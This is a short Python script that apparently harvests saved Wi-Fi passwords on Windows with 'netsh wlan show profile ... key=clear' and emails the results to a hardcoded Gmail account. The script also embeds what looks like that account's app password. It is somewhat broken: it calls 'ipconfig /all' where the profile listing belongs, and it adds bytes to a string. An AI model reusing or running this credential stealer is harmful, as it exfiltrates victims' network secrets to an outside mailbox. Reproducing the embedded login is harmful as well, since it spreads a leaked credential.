import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "ipconfig /all" #'netsh wlan show profile wifi-name key=clear'
networks = subprocess.check_output(command, shell=True).decode('latin1')
network_names_list = re.findall(r'(?:Profile\s*:\s)(.*)', networks)
result = ''
for network_name in network_names_list:
    command = 'netsh wlan show profile ' + network_name + ' key=clear'
    currunt_result = subprocess.check_output(command, shell=True)
    result = result + currunt_result

send_mail("kaliwolf2212@gmail.com", "hiwgivilyvkuohtb", result)
